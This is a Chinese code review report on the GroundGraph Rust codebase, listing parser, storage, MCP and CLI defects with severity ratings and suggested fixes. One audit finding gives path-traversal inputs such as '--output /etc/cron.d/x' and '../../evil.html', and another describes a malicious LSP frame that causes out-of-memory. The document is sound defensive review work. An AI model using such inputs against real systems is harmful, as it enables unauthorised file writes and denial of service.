pub fn clear_indexer_outputs(&mut self, indexer: &str) -> StoreResult<()> {
    self.with_write_tx(|tx| {
        tx.execute("DELETE FROM nodes WHERE indexer = ?1", params![indexer])?;
        tx.execute("DELETE FROM edge_assertions WHERE indexer = ?1", params![indexer])?;
        tx.execute("DELETE FROM evidence WHERE artifact_id NOT IN (SELECT id FROM nodes)")?;
        tx.execute("DELETE FROM symbol_ranges WHERE symbol_id NOT IN (SELECT id FROM nodes)")?;
        // ← 缺：DELETE FROM node_fts WHERE node_id NOT IN (SELECT id FROM nodes)
        Ok(())
    })
}
```

---

## Medium（20 个）

### 5. Dart `update_depth` 对 `"\\"` 误判为未转义引号

- **位置**：`crates/groundgraph-lang-dart/src/parser.rs:675-699`
- **问题**：判断引号是否被转义仅看前一字符 `prev != '\\'`。对包含单个反斜杠的字符串字面量 `"\\"`，第二个 `"` 的 `prev` 是 `\`，于是被认为"仍在字符串内"，但实际字符串已结束。其后的 `{` / `}` 被错误计入类/方法深度计数，破坏 Dart 类作用域跟踪。
- **触发场景**：任何 Dart 文件中包含 `"\\"` 后跟大括号，例如 `var s = "\\"; if (x) { ... }` —— 该 `{` 被错误计数，类边界漂移。
- **建议**：正确扫描转义（连续反斜杠成对消除）。
```rust
// parser.rs:681-683
if ch == quote_char && prev != '\\' {
    in_string = false;
}
```
- **关联**：`crates/groundgraph-lang-dart/src/references.rs:369-370` 的 `strip_strings_and_comments` 有相同 bug。

### 6. Dart `parse_import` / `extract_call_arg` 不处理转义引号

- **位置**：`crates/groundgraph-lang-dart/src/parser.rs:744-745`，`parser.rs:772`
- **问题**：`let end = rest[1..].find(quote)?` 在第一个匹配的引号字符处停止，即使被 `\` 转义。`import 'it\'s.dart';` 会得到截断的导入路径 `it\`；`test("it\'s working", () {});` 会得到错误的测试名。
- **触发场景**：Dart 文件 import 路径或测试名包含转义引号。
```rust
// parser.rs:744-745
let end = rest[1..].find(quote)?;
Some(rest[1..1 + end].to_string())
```

### 7. Dart `scan_identifiers` 用 `bytes[i] as char` 处理多字节 UTF-8

- **位置**：`crates/groundgraph-lang-dart/src/references.rs:325-329`
- **问题**：`bytes[i] as char` 将每个字节零扩展为 `u32` 并解释为 Unicode 码点。对 ≥ 0x80 的 UTF-8 续字节，会产生不正确的 `char`。当前因 `is_ident_start` / `is_ident_continue` 只匹配 ASCII，不会创建虚假标识符，但若将来扩展为接受 Unicode 字母（Dart 实际允许 Unicode 标识符），会产生错误的字符匹配。
- **触发场景**：源码含中文注释紧邻标识符时，扫描器会执行 `bytes[i] as char`。
```rust
// references.rs:325-329
let c = bytes[i] as char;
if is_ident_start(c) {
    let start = i;
    while i < bytes.len() && is_ident_continue(bytes[i] as char) {
```

### 8. MCP `pump` 用 `read_line` 而非 MCP stdio 规范的 `Content-Length` 帧

- **位置**：`crates/groundgraph-mcp/src/server.rs:35-57`
- **问题**：MCP stdio 传输官方使用 `Content-Length` 头帧（类似 LSP）。本实现按换行分隔 JSON。当前主流客户端（Cursor、Claude Desktop）也接受换行分隔 JSON，但严格合规的 MCP 客户端发送 `Content-Length: 123\r\n\r\n{...}` 不带尾随换行——`read_line` 永远看不到完整行，服务器挂起。此外，若 JSON 体本身包含嵌入换行（在 JSON 字符串值中合法），解析器会在换行处分割并收到无效 JSON。
- **触发场景**：严格实现 MCP 规范帧的客户端连接。
```rust
// server.rs:41-56
loop {
    line.clear();
    let n = reader.read_line(&mut line)?;
```

### 9. MCP `get_subgraph` 无内存上限的 BFS

- **位置**：`crates/groundgraph-mcp/src/tools/get_subgraph.rs:109-160`
- **问题**：while 循环从起始节点扩展，仅受 `depth` 参数限制；`depth` 无上限校验。调用方可传 `depth: 1000000`，或即使 `depth` 适中，密集连接的图也能产生百万级节点。每次迭代分配 JSON 值并推入 `nodes_out` / `edges_out`，无任何容量限制。
- **触发场景**：MCP 客户端在大型仓库上调用 `get_subgraph` with `depth: 50`。
```rust
// get_subgraph.rs:109-110
while let Some((id, hop)) = queue.pop_front() {
    if hop >= depth { continue; }
```

### 10. `schema_indexer.rs` Java 实体解析不识别字符串字面量中的大括号

- **位置**：`crates/groundgraph-engine/src/schema_indexer.rs:1615-1674`
- **问题**：`depth` 计算仅用 `line.matches('{').count() - line.matches('}').count()`。当代码行包含字符串字面量（如 `String json = "{\"key\": \"value\"}";`），字符串中的大括号也被计入深度。深度漂移后，原本位于 `depth == 1`（类体）的字段被误判为 `depth == 2`（方法体）而跳过，导致 ORM 表缺少列；或反之。
- **触发场景**：Java 实体类字段声明中包含含大括号的字符串字面量。
```rust
// schema_indexer.rs:1617-1618
let opens = i32::try_from(line.matches('{').count()).unwrap_or(i32::MAX);
let closes = i32::try_from(line.matches('}').count()).unwrap_or(i32::MAX);
// ...
depth += opens - closes;
```

### 11. `schema_indexer.rs` `balanced_parens` 不跟踪字符串字面量中的括号

- **位置**：`crates/groundgraph-engine/src/schema_indexer.rs:3436-3454`
- **问题**：函数仅计算 `(` 和 `)` 的深度，不考虑它们是否在字符串字面量中。`"some (text)"` 的括号被错误计入深度，导致提前匹配或匹配失败。在路由解析中，参数常含字符串字面量（如 `@GetMapping("/users({id})")` 或 Go `mux.HandleFunc("GET /path", handler)`），不正确的括号匹配会截断参数解析或跳过有效路由。
- **触发场景**：路由注解或 Go 路由注册中，参数列表内包含含括号的字符串字面量。
```rust
// schema_indexer.rs:3436-3454
fn balanced_parens(b: &[u8], open: usize) -> Option<(&str, usize)> {
    let mut depth = 0i32;
    let mut i = open;
    while i < b.len() {
        match b[i] {
            b'(' => depth += 1,
            b')' => { depth -= 1; /* ... */ }
            _ => {}  // ← 字符串字面量未跟踪
        }
```

### 12. `similarity.rs` tier-2 集群缺失 pair 时 `min_sim` 保持 1.0，置信度虚高

- **位置**：`crates/groundgraph-engine/src/similarity.rs:384-395`
- **问题**：UnionFind 通过传递性将 A-B、B-C 合并为一个集群（A 与 B 相似，B 与 C 相似，但 A 与 C 可能 Hamming 距离超阈值未直接比较）。后续计算 `min_sim` 时，`pair_scores.get(&(lo, hi))` 对未比较过的 A-C 对返回 `None`，`min_sim` 保持为初始值 1.0。结果：集群的 `similarity_score` 可能被报告为 1.0（完全相同），即使集群中实际存在不相似成员对——这是误导性的置信度。
- **触发场景**：三个函数 A、B、C，A-B 相似度 0.86，B-C 0.87，A-C 0.70（低于 0.85 阈值）。UnionFind 合并三者，`pair_scores` 无 A-C 条目，`min_sim` 保持 1.0。
```rust
// similarity.rs:384-395
let mut min_sim: f32 = 1.0;
for a in 0..indices.len() {
    for b in (a + 1)..indices.len() {
        // ...
        if let Some(s) = pair_scores.get(&(lo, hi)) {
            if *s < min_sim { min_sim = *s; }
        }
        // 缺失 pair 时 min_sim 不变
    }
}
```

### 13. `similarity.rs` `normalize` 对未关闭的 `/*` 注释静默吞 EOF

- **位置**：`crates/groundgraph-engine/src/similarity.rs:614-623`
- **问题**：若源文件包含未关闭的块注释（合并冲突残余、编辑器截断），`for next in chars.by_ref()` 会消耗输入直到 EOF 而不报错。该注释后的所有代码都被当作注释跳过，规范化输出严重失真（几乎为空），指纹不匹配，导致重复代码漏检或误判。
- **触发场景**：源文件含未关闭 `/*`（合并冲突、不完整文件、半截粘贴）。
```rust
// similarity.rs:614-623
Some('*') => {
    chars.next();
    let mut prev = '\0';
    for next in chars.by_ref() {
        if prev == '*' && next == '/' { break; }
        prev = next;
    }
    continue;
}
```
- **关联**：同文件 `consume_string_literal`（697-708）对未关闭字符串字面量有相同问题。

### 14. `scip_runner.rs` `execute` 用 `cmd.output()` 缓冲全部 stdout/stderr

- **位置**：`crates/groundgraph-engine/src/scip_runner.rs:543-565`
- **问题**：`Command::output()` 会将子进程的 stdout/stderr 全部读入 `Vec<u8>`。SCIP 索引器（如 `scip-python`、`rust-analyzer`）在大型仓库上可能产出数百 MB 的 stderr 日志。与 `lsp_client.rs` 的管道式读取不同，这里无背压机制，大型仓库索引时可能瞬时占用数 GB 内存。
- **触发场景**：在大型仓库（django、spring-framework）上运行 `groundgraph index`，SCIP indexer 输出大量 stderr 时。
```rust
// scip_runner.rs:551-553
let mut cmd = Command::new(program);
cmd.args(args).current_dir(cwd);
match cmd.output() {  // ← stdout + stderr 全部读入 Vec<u8>
```

### 15. 多个命令的 `--output` 路径无 `.groundgraph/` 限制（非侵入式字面违规）

- **位置**：`crates/groundgraph-cli/src/commands/search.rs:187-205`、`dashboard.rs:31-42`、`business_doc.rs:59-61`、`propose.rs:60-63`、`impact.rs:39-51`
- **问题**：用户可通过 `--output /etc/cron.d/x` 或 `--output ../../evil.html` 将报告写到 `.groundgraph/` 之外的任意位置。`resolve_html_output` 对绝对路径直接放行（`if p.is_absolute() { return Ok(p.clone()); }`），对相对路径以 `repo_root` 为前缀也无法阻止 `../` 穿越。CONTRIBUTING.md 明确要求"GroundGraph must never write outside `.groundgraph/` in a target repo"。
- **触发场景**：`groundgraph search --format html --output /tmp/evil` 或 `--output ../../evil.html`。
- **建议**：要么显式文档化 `--output` 是用户授权的越界写（user-intended），要么强制路径必须在 `.groundgraph/export/` 内。
```rust
// search.rs:192-196
if let Some(p) = requested {
    if p.is_absolute() {
        return Ok(p.clone());  // ← 直接放行绝对路径
    }
    return Ok(repo_root.join(p));  // ← 不阻止 ../ 穿越
}
```

### 16. `graph_mermaid.rs` Mermaid label 转义不充分

- **位置**：`crates/groundgraph-cli/src/commands/graph_mermaid.rs:144-146`
- **问题**：`escape_label` 只处理 `"` 和换行，但 Mermaid 语法中 `[ ] ( ) { } | > < #` 等字符有特殊含义。若 symbol 名包含这些字符（如 C++ `operator==`、`fn<T>`、`array[i]`），Mermaid 图表渲染断裂或语法错误。
- **触发场景**：索引包含 C++ operator、泛型、数组操作的代码后执行 `groundgraph search --format mermaid`。
```rust
// graph_mermaid.rs:144-146
fn escape_label(text: &str) -> String {
    text.replace('"', "\\\"").replace('\n', " ")
}
```

### 17. 多个命令的 `write_to` 无原子性，写入失败留下半成品

- **位置**：`crates/groundgraph-cli/src/commands/graph.rs:199-209`、`search.rs:93-94`、`business_doc.rs:68-76`、`propose.rs:70-78`、`connect.rs:54-63`
- **问题**：所有 `write_to` 函数都用 `std::fs::write` 直接覆盖目标文件。若写入过程中磁盘满或权限错误，目标文件被截断为空或部分内容。下次打开看到空白。该 `write_to` 被至少 5 个命令共享。
- **触发场景**：磁盘空间不足时 `groundgraph graph --format html` 生成 0 字节的 `graph.html`。
- **建议**：write-to-temp-then-rename 模式（同目录临时文件 + 持久化 rename）。

### 18. `language_traits::ALL_KINDS` 测试矩阵未覆盖 25 种新 NodeKind

- **位置**：`crates/groundgraph-core/src/language_traits.rs:451-509`（测试常量）vs `crates/groundgraph-core/src/node.rs:192-275`（`NodeKind::ALL`）
- **问题**：测试中硬编码的 `ALL_KINDS` 切片在 `CppMethod` 处停止（共 57 项），断言 `ALL_KINDS.len() == 57`。但 `NodeKind` 枚举有 82 个变体（含 `CSharp*`、`Ruby*`、`Php*`、`Kotlin*`、`DbTable`、`SqlMapperStmt`、`HttpRoute`）。这 25 种新类型**绕过**了 `language_traits` 中的所有矩阵测试。生产函数本身正确（match 分支齐全），但测试不验证；未来若有人从 `language_of` 误删 `CSharpMethod` 分支，测试仍通过。
- **触发场景**：违反 CONTRIBUTING.md 的"测试驱动"约定，未来回归无防护。
- **建议**：测试直接遍历 `NodeKind::ALL`（已存在的 single source of truth），删除手维护的 `ALL_KINDS` 切片。
```rust
// language_traits.rs:522-529
#[test]
fn matrix_total_count_matches_known_kinds() {
    assert_eq!(
        ALL_KINDS.len(),
        57,  // ← 硬编码 57，但 NodeKind::ALL 有 82 项
        "ALL_KINDS missing a NodeKind variant..."
    );
}
```

### 19. `repositories.rs` 批量 upsert 用变化的 SQL 字符串调用 `prepare_cached`，缓存永不命中

- **位置**：`crates/groundgraph-store/src/repositories.rs:125-165`（`upsert_nodes_bulk`）、`168-206`（`upsert_edges_bulk`）、`300-336`（`upsert_symbol_ranges_bulk`）
- **问题**：三个批量 upsert 方法为每个 chunk 生成 SQL，`VALUES (?,..), (?,..), ...` 重复次数等于 chunk 长度。`chunks(512)` 在尾部产生 1–511 行的短块，SQL 文本因 chunk 大小而异。将不同 SQL 字符串传给 `prepare_cached`，缓存条目从不重用——每个不同的 chunk 大小都获得新的缓存条目。缓存容量 64（`lib.rs:105`），最多 512 种 SQL 形状，缓存抖动，命中率近零，抵消 `prepare_cached` 优势。
- **触发场景**：批量插入 512 行以上（spring-framework 有 84k 个符号）。尾部短块始终唯一。
- **建议**：固定 chunk 大小（短块用 NULL 填充到 512），或改用单行 prepared statement 在事务内重复 execute。

### 20. `repositories.rs` `evidence_from_row` 手写 match 而非 `EvidenceKind::from_str()`

- **位置**：`crates/groundgraph-store/src/repositories.rs:631-653`
- **问题**：函数用硬编码 match 将字符串映射到 `EvidenceKind` 变体。与 `node_from_row` 使用 `NodeKind::from_str()`（单一真相源）不同，证据解码器无对应 `from_str`。若向 `EvidenceKind` 添加新变体并更新 `as_str()` 但忘记更新此 match，新类型的证据行会静默解码失败，抛出"unknown evidence kind"错误。
- **触发场景**：向 `EvidenceKind` 添加新变体（如 `AiAnnotation`）后读写不一致。
```rust
// repositories.rs:633-641
let kind = match kind_str.as_str() {
    "doc_section" => EvidenceKind::DocSection,
    // ...
    other => return Err(decode_error(2, format!("unknown evidence kind {other}"))),
};
```
- **建议**：在 `groundgraph-core::evidence` 上实现 `FromStr`，所有解码统一引用。

### 21. `repositories.rs` 批量 upsert 内部无事务，部分失败导致不可回滚的部分提交

- **位置**：`crates/groundgraph-store/src/repositories.rs:125-165`、`168-206`
- **问题**：批量方法直接在 `self.conn` 上运行，依赖调用方包在 `begin_bulk`/`commit_bulk` 中。若调用方忘记，每个 chunk 在自动提交模式下独立提交。5000 节点的批量插入若在第 3 块失败，前 1024 行已提交，调用方的错误处理无法回滚已提交块，数据库留下部分批量插入。
- **触发场景**：调用方未先调用 `begin_bulk` 即批量插入。
- **建议**：方法内部检测是否已在事务中，否则自动包装。

### 22. `search_aliases` 缺少 C# / Kotlin method & function 别名

- **位置**：`crates/groundgraph-core/src/language_traits.rs:416-443`
- **问题**：`search_aliases` 包含 `DartMethod`、`SwiftMethod`、`GoMethod`、`PythonMethod`、`TypescriptMethod`、`JavaMethod`、`RustMethod`、`CppMethod`，但缺少 `CSharpMethod`/`CSharpFunction`。其他语言（Ruby/PHP/Kotlin）的方法和函数变体在第 429-443 行同样缺失（或仅部分）。用户搜索 `["method", "fn"]` 别名时，C# 方法节点被排除。
- **触发场景**：用户搜索 "method" 期望找到 C# 方法。
```rust
// language_traits.rs:423-430
NodeKind::DartMethod
| NodeKind::SwiftMethod
| NodeKind::GoMethod
| NodeKind::PythonMethod
| NodeKind::TypescriptMethod
| NodeKind::JavaMethod
| NodeKind::RustMethod
| NodeKind::CppMethod => &["method", "fn"],
// ← CSharpMethod 缺失；RubyMethod/PhpMethod/KotlinMethod 同样
```

### 23. `Store::open` 的 PRAGMA 批处理非原子，部分失败后连接处于次优状态

- **位置**：`crates/groundgraph-store/src/lib.rs:93-96`
- **问题**：`execute_batch` 将 5 个 PRAGMA 作为单个批处理运行。若其中 `mmap_size` 在 mmap 受限环境（容器、某些 macOS 配置）失败，整个批处理中止，但 `journal_mode=WAL` 和 `synchronous=NORMAL` 可能已应用，`busy_timeout`/`cache_size`/`mmap_size` 未应用。错误传播（良好），但 SQLite 连接保持打开且处于次优状态——调用方无法知道哪些 PRAGMA 已设。
- **触发场景**：在 mmap 受限环境中打开 store。
```rust
// lib.rs:93-96
conn.execute_batch(
    "PRAGMA journal_mode=WAL; PRAGMA synchronous=NORMAL; PRAGMA busy_timeout=5000;\
     PRAGMA cache_size=-65536; PRAGMA mmap_size=268435456;",
)
```
- **建议**：拆为独立 `PRAGMA` 语句，逐条执行并记录失败。

### 24. MCP `serialize` 备用 JSON 转义不完整，可能产生非法 JSON

- **位置**：`crates/groundgraph-mcp/src/server.rs:163-172`
- **问题**：当 `serde_json::to_string` 失败时，备用方案仅 `.replace('"', "\\\"")`。若错误消息包含 `\n`、`\r`、`\t`、`\\`，生成的字符串包含原始控制字符，违反 RFC 8259，破坏客户端 JSON 解析器。
- **触发场景**：`serde_json::to_string` 在含换行的错误消息上失败（极低概率，但可能来自引擎 I/O 错误）。
```rust
// server.rs:167-170
format!(
    r#"{{"jsonrpc":"2.0","id":null,"error":{{"code":-32603,"message":"failed to serialise response: {}"}}}}"#,
    e.to_string().replace('"', "\\\"")  // ← 不处理 \n \r \t \\
)
```

---

## Low（6 个）

### 25. `lsp_client.rs` `shutdown()` 在 force_kill 后仍尝试写 stdin 通知

- **位置**：`crates/groundgraph-engine/src/lsp_client.rs:409-422`
- **问题**：`shutdown()` 先发 shutdown 请求，超时则 `read_response_for` 内部调 `force_kill`（child 已 None），随后 `shutdown()` 仍尝试 `notify("exit")` 写到已关闭的 stdin 返回 Err，再对 None child 调 `wait()`。最终 `shutdown_result` 错误被 `.context()` 包裹但被上游丢弃（`lsp_indexer.rs:298` 只取 skip reason）。逻辑不致命但冗余。
- **触发场景**：LSP 服务器卡住导致 shutdown 超时。

### 26. `dart_indexer.rs` `backfill_referenced_symbols` 对每个 reference 做线性搜索

- **位置**：`crates/groundgraph-engine/src/dart_indexer.rs:228-264`
- **问题**：对 `batch.references` 中每个 `from`/`to` endpoint，若不在 `present` 集合中，对 `overlay_symbols` 做 `.iter().find()` 线性搜索。reference 边可达万级，overlay_symbols 数千，O(R*S) 可达数百万次比较。
- **触发场景**：大型 Dart 项目（Flutter 电商应用）analyzer sidecar 索引。
- **建议**：构造 `HashMap<ArtifactId, &Symbol>` 索引。

### 27. `lsp_indexer.rs` warmup 总预算 15s，CI 冷启动易超时

- **位置**：`crates/groundgraph-engine/src/lsp_indexer.rs:630, 636`
- **问题**：`WARMUP_TOTAL_BUDGET = 15s`，`WARMUP_SLEEP = 250ms`。若 sourcekit-lsp 的 IndexStoreDB 冷启动未就绪，第一个探测文件就会消耗整个 15s 预算（外层循环 `continue` 在收到非空结果时）。
- **触发场景**：Swift 项目 CI 中首次 `groundgraph index`。

### 28. `docs_indexer.rs` 使用 `Vec` 做去重，大文档仓库 O(N²)

- **位置**：`crates/groundgraph-engine/src/docs_indexer.rs:104, 158, 185`
- **问题**：`visited: Vec<String>`，每次 `visited.iter().any(|v| v == &rel)` 是 O(N)。三次 walk 累计，文档密集型项目（如 spring-framework 470 个 `.adoc` + `*.md` + `*.rst`）总去重成本可达 O(N²)。
- **建议**：换 `HashSet<String>`。
```rust
// docs_indexer.rs:104, 158, 185
let mut visited = Vec::new();
// ...
if visited.iter().any(|v| v == &rel) { continue; }  // O(N) per file
visited.push(rel.clone());
```

### 29. `repositories.rs` 读取路径未用 `prepare_cached`，重复查询重新解析 SQL

- **位置**：`crates/groundgraph-store/src/repositories.rs:88-89`、`101-103`、`111-113`、`251-257`、`287-291`、`361-363`、`377-379`
- **问题**：`find_node`、`list_nodes_by_kind`、`list_all_nodes`、`query_edges`、`list_evidence_for_artifact`、`list_symbol_ranges_for_file`、`find_symbols_intersecting` 都用 `self.conn.prepare(&sql)` 而非 `prepare_cached`。每次调用重新解析 SQL。`search` 命中扇出场景下 `list_edges_from/to` 可能被调上千次。
- **建议**：读取路径同样使用 `prepare_cached`。
```rust
// repositories.rs:88-89
pub fn find_node(&self, id: &ArtifactId) -> StoreResult<Option<Node>> {
    let sql = format!("SELECT {SELECT_NODE_COLS} FROM nodes WHERE id = ?1");
    let mut stmt = self.conn.prepare(&sql).map_err(StoreError::sqlite)?;  // ← 非 cached
```

### 30. `main.rs` `run()` 在不存在的 `--repo-root` 仍写入 stats

- **位置**：`crates/groundgraph-cli/src/main.rs:1023-1035`
- **问题**：`--repo-root` 默认 `.`，但 `run()` 不验证路径存在。`stats::append_stat` 在 `run()` 末尾无条件执行，会创建 `.groundgraph/stats.jsonl`——若用户打错 `--repo-root /tm`，stats 文件被写到 `/tm/.groundgraph/stats.jsonl`。
- **触发场景**：`groundgraph --repo-root /tm search "foo"` 命令失败后。
```rust
// main.rs:1023-1035 附近
let _ = groundgraph_engine::stats::append_stat(&repo_root.join(".groundgraph"), &stat);
```

---

## 审查统计

| 严重度 | 数量 |
|---|---|
| High | 4 |
| Medium | 20 |
| Low | 6 |
| **合计** | **30** |

按模块分布：

| 模块 | 问题数 |
|---|---|
| groundgraph-cli（HTML/输出/命令） | 7 |
| groundgraph-engine（schema_indexer / similarity / 数据流） | 9 |
| groundgraph-store（repositories / lib） | 6 |
| groundgraph-lang-dart | 3 |
| groundgraph-mcp | 3 |
| groundgraph-core | 2 |

**核心结论**：
- 项目工程质量整体很高（禁 unsafe、anyhow 错误传播、子进程有超时清理），未发现 Critical 级别数据损坏或远程代码执行漏洞。
- 最值得优先修复的 4 个 High 问题集中在 **HTML 渲染管道**（UTF-8 损坏 + innerHTML 注入）和 **FTS 索引一致性**（幽灵节点）——前两个影响所有中文用户的搜索/graph HTML 报告，后者影响增量重索引的搜索正确性。
- 中等问题集中在 **手写扫描器的字符串/注释 totality**（Dart parser、Java entity parser、balanced_parens、similarity normalize）和 **路径/输出安全**（--output 越界、Mermaid 转义）。
- 测试矩阵问题（#20、#24）虽不直接影响生产，但违反 CONTRIBUTING.md 的测试驱动约定，未来回归无防护。
# GroundGraph 代码审查报告（归档：#31–#60 已处理）

> **归档时间**：2026-06-13
> **归档原因**：#31–#60（共 30 个）已于 commit `2795b35`（2026-06-12）完成 TDD 修复或按设计澄清。
> **当前活跃问题**：见 [issues2.md](issues2.md) 的 #61–#130（共 70 个未处理）。
>
> 本文件保存原始审查记录与 2026-06-12 复核结果表（文末「处理结果」一节）作为历史参考。**不要在本文件追加新问题**——新发现请写入 [issues2.md](issues2.md)。

---

# GroundGraph 代码审查报告（第二批）

**审查时间**：2026-06-12
**审查范围**：crates/* 全部 src 文件（约 91,750 行 Rust 代码）
**审查方法**：5 个并行 agent 按模块分工（core+store / engine 算法 / engine 数据流 / dart+mcp / cli），主审查交叉去重并比对 issues.md 第一批 30 个问题
**与 [issues.md](issues.md) 的关系**：本文件**仅记录新发现**，所有条目均与第一批 30 个问题比对去重；编号从 31 开始。

共记录 **50 个新问题**（编号 31–80）：第一批 30 个（#31–#60，已完成 2026-06-12 复核，处理结果见文末「处理结果」一节）+ 第三批续审 20 个（#61–#80，2026-06-13 从测试代码、配置/构建、子进程信号、edge/evidence 模型、并发 IO 5 个新角度发现，见文末「第三批扩展」一节）。严重度分级与第一批一致：**High**（生产可触发，影响数据/安全）、**Medium**（边界条件或显著性能/设计缺陷）、**Low**（性能微优化或潜在隐患）。

> **2026-06-12 复核完毕**（针对 #31–#60）— 处理结果表见文末「处理结果」一节：确认修复 22、按设计 4、误报 3、已被先前修复覆盖 2。
> **2026-06-13 续审**（#61–#80）— 20 个新发现尚未处理，按主题聚类与核心续审结论见文末「第三批扩展」末尾。

---

## High（13 个）

### 31. 服务端路由节点与客户端 consumed 路由节点 ID 永不匹配（跨图断链）

- **位置**：`crates/groundgraph-engine/src/schema_indexer.rs:962-988`、`3105-3111`
- **问题**：服务端 `http_route_node` 用原始路径 `r.path`（如 Spring `GET /api/users/{id}` → `http_route::path::GET /api/users/{id}`）。而客户端 `consumed_route_node` 用 `normalize_consumed_route_path` 把 `${id}` 折叠成 `:param`（如 `/api/users/:param`）。**两套 ID 方案不统一**——同样的语义路径（参数占位符）生成不同的 `ArtifactId`，跨图链接（`link_inline_consumed_routes`）永远命中不到，HTTP 服务端到客户端的 Calls 边缺失。
- **触发场景**：Spring `@GetMapping("/users/{id}")` + Dart 客户端 `'/users/${userId}'` —— 期望链接 `HttpRoute←Calls←DartMethod`，实际两条记录 ID 不同永远不连。
- **建议**：让 `http_route_node` 也走同一个参数占位符规范化（`{x}` / `:x` / `<x>` / `${x}` / `<int:x>` 全部折叠为 `:param`），复用 `normalize_consumed_route_path` 实现。
```rust
// schema_indexer.rs:963 当前
let id = ArtifactId::new(format!("http_route::{rel_path}::{} {}", r.verb, r.path));
// 应改为
let canon = normalize_consumed_route_path(&r.path);
let id = ArtifactId::new(format!("http_route::{rel_path}::{} {}", r.verb, canon));
```

### 32. `lsp_client::read_message` 的 `Content-Length` 无上限，可触发巨型分配 / OOM

- **位置**：`crates/groundgraph-engine/src/lsp_client.rs:841-875`
- **问题**：`content_length: Option<usize>` 直接 `.parse::<usize>()` 后 `vec![0u8; length]`，无任何上限校验。行为异常或恶意 LSP 服务器声明 `Content-Length: 99999999999` 会立即触发多 GB 内存分配并 OOM 杀死 `groundgraph` 进程（甚至整台 CI 节点）。`Content-Length: 0` 时 `read_exact(&mut [])` 返回 Ok 但 `serde_json::from_slice(&[])` 报错。
- **触发场景**：服务器在 `initialize` 时发回异常帧（部分 `gopls`/`sourcekit-lsp` 旧版本在边界情况下会发空帧或重发 `Content-Length`），导致整个索引崩溃。
- **建议**：硬上限校验。
```rust
const MAX_LSP_FRAME: usize = 64 * 1024 * 1024; // 64 MiB
let length = content_length.ok_or_else(|| anyhow!("missing Content-Length"))?;
if length == 0 || length > MAX_LSP_FRAME {
    bail!("implausible Content-Length {length}");
}
```

### 33. `scip_runner::inputs_digest` 用 mtime+length 做指纹，内容变更但 mtime/length 相同时静默跳过索引

- **位置**：`crates/groundgraph-engine/src/scip_runner.rs:480-523`
- **问题**：摘要 = 排序的 `(rel_path, len, mtime)` 元组。`is_skipped_module_scan_dir` 仅剪 `node_modules` / 隐藏目录；**Rust `target/` 不在 `ALWAYS_SKIP_DIRS`**，build script 生成的 `.rs` 文件污染摘要。更严重的是：构建工具链（`cargo` / `bazel` / `webpack`）常常把内容改写后保留 size 与整秒级 mtime（HFS+/FAT32 精度 1s/2s），两次 `groundgraph index` 之间实际源码已变但摘要相同 → **跳过重新生成** → SCIP 覆盖层基于陈旧索引，Calls/References 边缺失。
- **触发场景**：CI 上 `cargo build` 后立即 `groundgraph index`，触发了 build-script 重写 `OUT_DIR/foo.rs` 但 mtime 截断；下一次 `groundgraph index` 看到 `(target/.../foo.rs, 1234, t)` 与上次相同 → 跳过。
- **建议**：(a) 把 `target` / `build` / `dist` / `out` 加入 `ALWAYS_SKIP_DIRS`；(b) 对小文件（< 4 KiB）改读内容做哈希，否则至少用 `mtime` 的纳秒部分。

### 34. `index_repository` 全有或全无：单个 indexer 失败回滚之前所有成功的 indexer 工作

- **位置**：`crates/groundgraph-engine/src/index.rs:148-461`
- **问题**：`index_repository` 在第 164 行 `store.begin_bulk()` 开启单个大事务，然后顺序执行 docs → dart → swift → go → python → ts → java → rust → treesitter → scip → fulltext，每步先 `clear_indexer_outputs(indexer)` 删除旧数据再写入新数据。如果**任何一步**通过 `?` 早期返回（典型场景：`scip_runner` 子进程超时、tree-sitter parser panic、磁盘满），函数返回 `Err`，`commit_bulk()` 永不执行，连接 drop 时 SQLite 回滚整个事务——**前 7 个 indexer 成功写入的 8 万个节点全部回滚**。用户必须完整重跑（含 Dart analyzer sidecar 冷启动、SCIP 子进程、tree-sitter 全量解析）。
- **触发场景**：在大型仓库（spring-framework 18.6s、typescript 16s）上 `groundgraph index`，单个 indexer（如 `scip_runner`）失败；或 LSP 服务器卡住超时；或某文件因权限被拒读取。
- **建议**：每个 indexer 用独立的子事务提交自己的工作单元，单个 indexer 失败只回滚该 indexer。或捕获每个 indexer 的错误并收集到 `result.warnings`，让其他 indexer 继续执行。

### 35. `stats::append_stat` 无文件锁，并发 CLI 调用导致 jsonl 行交错损坏

- **位置**：`crates/groundgraph-engine/src/stats.rs:101-111`
- **问题**：`append_stat` 用 `OpenOptions::new().append(true).open()` 写入一行 JSON。POSIX `O_APPEND` 仅保证**单次 `write()` 调用**且 size ≤ `PIPE_BUF`（macOS/Linux 通常 4096）原子。`CommandStat` 含大 `BTreeMap<String, i64>` metrics 时单行轻易 > 4 KB，`f.write_all` 可能拆成多个底层 `write()` 系统调用。多个并发 `groundgraph` 进程（CI 流水线、watcher、用户多终端）追加同一 `.groundgraph/stats.jsonl` 时，两行字节交错产生畸形 JSON。`load_stats` 第 128 行 `if let Ok(stat) = ...` 静默丢弃整条记录——**统计丢失无任何告警**。
- **触发场景**：CI 并发执行 `groundgraph index` + `groundgraph search` + `groundgraph impact` 同时写入同一仓库的 stats.jsonl。
- **建议**：用 `fs2::FileExt::lock_exclusive` 文件锁；或写入 `.tmp` 文件后 rename（但 append 语义会丢失）；或保证 `line.len() < PIPE_BUF`。
```rust
// stats.rs:106-110
let mut f = OpenOptions::new().create(true).append(true).open(path)?;  // ← 无锁
f.write_all(line.as_bytes())  // ← 多次 write 可能交错
```

### 36. Dart 解析器不识别 `enum` / `mixin` / `extension` / `typedef` / `factory`，体被错误消费

- **位置**：`crates/groundgraph-lang-dart/src/parser.rs:10-12, 157-245, 710-735, 818-841`
- **问题**：模块 doc 明示 "Non-goals: typedef, mixins, enums, extension methods"，但仅是"不识别"——这些声明不会被注册为符号，**但它们带有的 `{` 仍会进入 `update_depth` 的深度计数**。后果：
  1. `enum Foo { A, B, C }` 内部的 `{` 让 `depth` 递增；enum 在 Dart 中可声明成员方法，但 `class_for_decl` 因 `class_stack` 为空时进入 `else if depth == 0` 分支会过滤掉这些方法。
  2. `factory Foo.fromJson(...) { ... }` 被 `parse_constructor` 拒绝（前缀 `factory ` 不匹配类名 `Foo`），然后落入 `parse_method`：`cleaned = "Foo"`（`take_while` 在 `.` 处停止），**同一类里多个 factory 全部坍缩到名为 `Foo` 的 method**，符号冲突。
  3. `typedef IntList = List<int>;` 中的 `=` 让 `parse_field` 误判为字段，type_token 取 `IntList`，name_token 取 `List`。
- **触发场景**：任何含 enum、mixin、extension、factory、typedef 的 Dart 文件——Flutter 项目常见结构（每个 State 类都伴随 factory，每个 model 都有 enum）。
